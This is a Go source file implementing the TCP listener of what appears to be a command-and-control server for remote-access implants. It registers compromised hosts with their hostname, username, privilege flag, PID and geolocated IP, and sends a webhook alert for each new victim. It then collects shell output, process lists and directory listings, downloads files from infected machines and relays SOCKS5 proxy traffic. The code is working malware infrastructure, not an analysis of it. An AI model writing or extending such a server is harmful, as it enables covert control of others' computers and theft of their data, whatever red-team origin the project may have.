package tcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/logger"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// TCPClient TCP客户端结构
type TCPClient struct {
	Conn          net.Conn
	UID           string
	WriteMu       sync.Mutex
	StopChan      chan struct{}
	LastHeartbeat time.Time
	TimeoutCount  int
	IsClosed      bool
	CloseOnce     sync.Once
	Reader        *bufio.Reader
}

// TCPServer TCP服务器结构
type TCPServer struct {
	Listener net.Listener
	StopChan chan struct{}
}

// TCPClientManager TCP客户端管理器
type TCPClientManager struct {
	Clients map[string]*TCPClient
	Mu      sync.RWMutex
}

var (
	globalTCPClientManager = &TCPClientManager{
		Clients: make(map[string]*TCPClient),
	}
)

// Add 添加客户端到管理器
func (cm *TCPClientManager) Add(uid string, client *TCPClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("TCP client added:", uid, "Total TCP clients:", len(cm.Clients))
}

// Remove 从管理器移除客户端
func (cm *TCPClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("TCP client removed:", uid, "Total TCP clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *TCPClientManager) Get(uid string) (*TCPClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll 关闭所有客户端
func (cm *TCPClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
	logger.Info("All TCP clients closed")
}

// Close 安全关闭TCP客户端
func (c *TCPClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		// 关闭停止通道
		if c.StopChan != nil {
			close(c.StopChan)
		}

		// 关闭TCP连接
		if c.Conn != nil {
			c.Conn.Close()
		}

		// 从全局管理器移除
		if c.UID != "" {
			globalTCPClientManager.Remove(c.UID)
		}

		// 从连接类型管理器移除
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, c.UID)
		connection.MuClientListenerType.Unlock()

		// 更新数据库状态为离线
		if c.UID != "" {
			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
			logger.Info("TCP client marked as offline:", c.UID)
		}

		logger.Info("TCP connection closed for client:", c.UID)
	})
}

// Write 安全发送数据
func (c *TCPClient) Write(data []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := c.Conn.Write(data)
	return err
}

// WriteWithLength 发送带长度的消息
func (c *TCPClient) WriteWithLength(data []byte) error {
	// 创建带长度的消息
	length := uint32(len(data))
	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(buf[:4], length)
	copy(buf[4:], data)

	return c.Write(buf)
}

// startHeartbeatCheck 启动心跳检查
func (c *TCPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("TCP heartbeat checker panic recovered:", r)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.IsClosed {
				return
			}

			// 检查心跳是否超时
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("TCP heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)

				if c.TimeoutCount >= 3 {
					logger.Info("Max TCP heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}

			// 可选：发送心跳检查包
			if c.TimeoutCount > 0 {
				heartbeatMsg := make([]byte, 8)
				binary.BigEndian.PutUint32(heartbeatMsg[:4], 3) // 心跳类型
				binary.BigEndian.PutUint32(heartbeatMsg[4:], 0) // 空内容
				c.Write(heartbeatMsg)
			}

		case <-c.StopChan:
			return
		}
	}
}

// HandleTcpConnection 处理TCP连接
func HandleTcpConnection(conn net.Conn) {
	logger.Info("New TCP connection from:", conn.RemoteAddr())

	// 创建客户端对象
	client := &TCPClient{
		Conn:          conn,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReader(conn),
	}

	defer func() {
		// 确保连接被关闭
		client.Close()
		logger.Info("TCP handler finished for:", conn.RemoteAddr())
	}()

	// 设置连接超时
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// 主消息处理循环
	for {
		if client.IsClosed {
			break
		}

		// 重置读取超时
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		// 读取消息长度
		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err == io.EOF {
				logger.Info("Client closed connection:", conn.RemoteAddr())
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP read timeout for:", conn.RemoteAddr())
				// 继续等待
				continue
			} else {
				logger.Error("Error reading message length:", err, "from:", conn.RemoteAddr())
			}
			break
		}

		// 验证消息长度（防止恶意攻击）
		if length > 10*1024*1024 { // 限制为10MB
			logger.Error("Message too large:", length, "from:", conn.RemoteAddr())
			break
		}

		if length == 0 {
			logger.Warn("Received zero-length message from:", conn.RemoteAddr())
			continue
		}

		// 读取消息内容
		message := make([]byte, length)
		_, err = io.ReadFull(client.Reader, message)
		if err != nil {
			if err == io.EOF {
				logger.Info("Client closed connection while reading:", conn.RemoteAddr())
			} else {
				logger.Error("Error reading message content:", err, "from:", conn.RemoteAddr())
			}
			break
		}

		// 处理消息
		if len(message) < 4 {
			logger.Error("Message too short from:", conn.RemoteAddr())
			continue
		}

		msgTypeBytes := message[:4]
		msgType := binary.BigEndian.Uint32(msgTypeBytes)

		switch msgType {
		case 1: // firstBlood
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				continue
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				continue
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			// 添加到全局管理器
			globalTCPClientManager.Add(uid, client)

			// 更新连接类型
			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "tcp"
			connection.MuClientListenerType.Unlock()

			// 启动心跳检查
			go client.startHeartbeatCheck()

			// 检查客户端是否已存在
			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists { // FirstBlood
				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4:5][0])
				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()
				osInfo := string(metainfo[9:])

				osArray := strings.Split(osInfo, "\t")
				hostName := osArray[0]
				UserName := osArray[1]
				processName := osArray[2]

				// 获取外网IP
				remoteAddr := conn.RemoteAddr().String()
				externalIp, _, err := net.SplitHostPort(remoteAddr)
				if err != nil {
					externalIp = remoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "01-02 15:04"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				// 创建新客户端记录
				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   UserName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    address,
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
				}

				// 插入数据库
				if _, err := database.Engine.Insert(&c); err != nil {
					logger.Error("Failed to insert client:", err)
				}

				// 插入相关表
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

				// 发送Webhook通知
				if exists, key := webhooks.CheckEnable(); exists {
					webhooks.SendWecom(c, key)
				}

				logger.Info("New TCP client registered:", uid, "IP:", externalIp)
			} else {
				// 更新在线状态
				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
				logger.Info("TCP client reconnected:", uid)
			}

		case 2: // otherMsg
			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("OtherMsg too short")
				continue
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])
			if len(msg) < int(4+metaLen) {
				logger.Error("Invalid meta length")
				continue
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				continue
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				continue
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 检查客户端是否在线
			if _, exists := globalTCPClientManager.Get(uid); !exists {
				logger.Warn("Received message from offline TCP client:", uid)
				continue
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				continue
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("First decrypt failed:", err)
				continue
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("Second decrypt failed:", err)
				continue
			}

			if len(dataBytes) < 4 {
				logger.Error("Decrypted data too short")
				continue
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			switch replyType {
			case 0: // 命令行展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					shell.ShellContent += string(data) + "\n"
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case 31: // 错误展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					shell.ShellContent += "!Error: " + string(data) + "\n"
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case command.PS:
				command.VarPidQueue.Add(uid, string(data))

			case command.FileBrowse:
				command.VarFileBrowserQueue.Add(uid, string(data))

			case 22: // 文件下载第一条信息
				if len(data) < 4 {
					logger.Error("File download info too short")
					break
				}

				fileLen := int(binary.BigEndian.Uint32(data[:4]))
				filePath := string(data[4:])

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("Security check failed:", err)
					break
				}

				// 确保下载目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("Failed to create download directory:", err)
					break
				}

				// 更新数据库
				sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
				if err != nil {
					logger.Error("Database update failed:", err)
				}

				// 检查并删除已存在的文件
				if _, err := os.Stat(fullPath); err == nil {
					if err := os.Remove(fullPath); err != nil {
						logger.Error("Failed to remove existing file:", err)
						break
					}
				}

				// 创建新文件
				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
				if err != nil {
					logger.Error("Failed to create file:", err)
					break
				}
				fp.Close()

			case command.DOWNLOAD: // 文件下载
				if len(data) < 4 {
					logger.Error("Download data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("Invalid file path length in download")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("Security check failed:", err)
					break
				}

				var fileDownloads database.Downloads
				if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
					fileDownloads.DownloadedSize += len(fileContent)
					database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
				}

				// 确保目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("Failed to create download directory:", err)
					break
				}

				// 追加文件内容
				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
				if err != nil {
					logger.Error("Failed to open file:", err)
					break
				}

				if _, err := fp.Write(fileContent); err != nil {
					logger.Error("Failed to write file content:", err)
				}
				fp.Close()

			case command.DRIVES:
				drives := utils.GetExistingDrives(data)
				command.VarDrivesQueue.Add(uid, drives)

			case command.FileContent:
				if len(data) < 4 {
					logger.Error("File content data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("Invalid file path length in file content")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

			case command.Socks5Data:
				if len(data) < 16 {
					logger.Error("Socks5 data too short")
					break
				}

				md5sign := data[:16]
				rawData := data[16:]
				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))

			default:
				logger.Warn("Unknown TCP reply type:", replyType)
			}

		case 3: // heartBeat
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				continue
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				continue
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 更新心跳时间
			if c, exists := globalTCPClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("Unknown TCP message type:", msgType)
		}
	}
}

// Cleanup 全局清理函数
func Cleanup() {
	logger.Info("Starting TCP cleanup...")
	globalTCPClientManager.CloseAll()
	logger.Info("TCP cleanup completed")
}

// GetClientStats 获取客户端统计信息
func GetClientStats() map[string]interface{} {
	globalTCPClientManager.Mu.RLock()
	defer globalTCPClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_tcp_clients"] = len(globalTCPClientManager.Clients)

	onlineCount := 0
	for _, client := range globalTCPClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_tcp_clients"] = onlineCount

	return stats
}

// GetClient 获取指定TCP客户端
func GetClient(uid string) *TCPClient {
	if client, exists := globalTCPClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient 向指定TCP客户端发送消息
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("TCP client not found or offline")
	}

	return client.Write(message)
}

// BroadcastToAll 广播消息给所有TCP客户端
func BroadcastToAll(message []byte) {
	globalTCPClientManager.Mu.RLock()
	defer globalTCPClientManager.Mu.RUnlock()

	for uid, client := range globalTCPClientManager.Clients {
		if !client.IsClosed {
			if err := client.WriteWithLength(message); err != nil {
				logger.Error("Failed to broadcast to TCP client:", uid, "Error:", err)
			}
		}
	}
}
